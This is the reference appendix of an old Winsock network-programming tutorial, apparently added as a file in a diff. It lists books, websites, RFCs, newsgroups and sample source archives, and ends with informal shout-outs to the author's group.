+Sections 5.1, 5.2 and section 8 dealt with the Info Gathering tutorial from Raven.
+
+Section 5.3 - Nuker, The Nuke program is dealt with in the tutorial on DoS attacks.
+
+Section 6.0 Forging e-mail was discussed in the SMTP tutorial and anonymity tutorial also by raven.
+
+Section 7.0 FTP is discussed in its relative tutorial.
+
+=========================================================================================================
+
+
+[ BOOKS ]
+
+There are a few books out there on Windows socket programming so off the top of my head;
+
+Programming Winsock by Arthur Dumas
+Windows Sockets Network Programming by Bob Quinn and David K. Shute
+
+Also I feel I should mention the book,
+Programming Windows Fifth Edition by Charles Petzold.
+
+Altough the information on socket programming or WinInet programming is limited it is a great book on
+windows vc++ in general and would come in very useful.
+
+
+[ VENDOR SPECIFIC DOCUMENTS ]
+
+Intel and Nokia's Narrowband Sockets Specification - A winsock API and SDK for wireless pagers and cell
+phones.
+
+
+[ ON THE NET ]
+
+http://www.geocities.com/winnetprogram
+
+http://www.microsoft.com/win32dev/netwrk/winsock2/ws295sdk.html
+
+http://www.stardust.com/welcome.html Some Information on Winsock.
+
+http://www.cis.ohio-state.edu/hypertext/faq/usenet/ibmpc-tcp-ip-faq/part1/faq.html  -  A FAQ.
+ftp://SunSite.UNC.EDU/pub/micro/pc-stuff/ms-windows/winsock/FAQ  -  Winsock specification FAQ.
+
+http://world.std.com/~jimf/papers/sockets/sockets.html  -  BSD Sockets.
+
+
+ftp://ftp.microsoft.com/bussys/winsock/winsock2
+
+
+[ MAILING LIST ]
+
+There should be a mailing list available on the website, www.geocities.com/winnetprogram
+
+
+Send an e-mail to listserv@mailbag.intel.com
+make sure the subject line is blank and have the following line of text in the body ONLY
+
+subscribe winsock-2
+
+
+And you will be subscribed to the winsock mailing list :). 
+Visit http://www.stardust.com/hypermail/winsock2 for the mailing list archive.
+
+Visit http://www.stardust.com/wsresource/winsock/wslists.html for some mailing lists.
+
+
+[ NETWORK PAPERS ]
+
+An excellent paper on the internet and protocols is Hedricks, Introduction to the Internet Protocols
+available from packetstorm.securify.com
+
+
+[ RFC'S ]
+
+RFC stands for Request For Comment and this is how protocols are made. Before HTTP or FTP were protocols
+they were released as RFC's then implemented. RFC's also contain information on networks.
+
+rfc1009      	-  Overview of Routers and Gateways.
+
+rfc973      	-  An update for domains.
+
+rfc959      	-  FTP
+
+rfc937      	-  POP2
+
+rfc854/5      	-  Telnet
+
+rfc814      	-  Names and Ports
+
+rfc793      	-  TCP
+
+rfc792      	-  ICMP
+
+rfc791      	-  IP
+
+rfc768      	-  UDP
+
+
+[ NEWS GROUPS ]
+
+USENET
+
+alt.winsock.programming
+comp.os.ms-windows.programmer.tools.winsock. 
+
+
+________________________________________________________________________________________________________
+
+
+
+APPENDIX F - CODE
+=======================================
+
+
+[ SOURCE CODE ]
+
+http://www.neca.com/~vmis/  -  Some good source code and tutorials.
+
+ftp://ftp.ksc.nasa.gov/pub/winvn/source/current/winvn  -  WinVN NNTP Newsreader.
+
+ftp://ftp.stardust.com/pub/winsock/version1/sample/wsftpsrc.zip  -  WS_FTP FTP client.
+
+ftp://ftp.mv.com/pub/ddj/1993/1993.02/1993-feb.zip  -  Finger client/server.
+
+ftp://ftp.cdrom.com/.22/cica/win3/winsock/serweb03.zip  -  WWW server.
+
+http://www.goodnet.com/~esnible/mercwsrc.zip  -  A MUD server ported from Unix to Windows.
+
+http://www.codeproject.com  -  Contains articles, tutorials and source code for internet programming,
+multiple languages.
+
+
+
+[ Visual Components ]
+
+There are several visual components available for Borland C++ Builder and for Delphi.
+Some of these also come in Active-X versions so you can use them with other development environments
+like Visual Basic.
+
+IP works from DevSoft (www.dev-soft.com) is a commercial TCP/IP suite with several components for 
+internet programming.
+
+Some free Open Source ones are also available (Keep it Open!) such as
+
+Francois Piettes components from www.rtfm.be/fpiette/indexuk.htm.
+
+
+________________________________________________________________________________________________________
+
+
+[ SHOUTS! ]
+
+Thanks to every-1 that helped with this tutorial...   well no-1 would actually give me aby
+help so screw you guys lol,
+but thanks to all the guys at bsrf for having the patience for putting up with all my delays.
+And of course shouts out to the usual suspects!!
+
+Starman Jones     - you crazy little bastard.
+Vsus              - haven't heard from ya in a while.
+Exit              - haven't even met you at all but jonsie has been tellin stories
+Delusive          - Delusive's breasts owns j00!!!!
+Bracaman          - For inspiration!!!!
+
+</pre>
+</html>
